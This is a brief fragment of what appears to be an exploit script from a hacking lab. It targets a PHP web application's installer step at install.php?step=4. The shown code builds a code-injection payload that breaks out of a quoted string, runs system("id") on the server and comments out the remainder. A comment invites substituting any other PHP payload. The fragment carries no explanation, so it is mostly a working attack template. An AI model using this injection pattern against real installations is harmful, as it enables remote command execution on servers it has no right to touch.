...
base_url = "https://0r4kq3s32xzr3q0rlmd1xdy.eu-central-1.attackdefensecloudlabs.com/"
target_url = "https://0r4kq3s32xzr3q0rlmd1xdy.eu-central-1.attackdefensecloudlabs.com/install/install.php?step=4"
...
payload = '\');'
payload += 'system("id");'    # this is where you enter you PHP payload
payload += '/*'
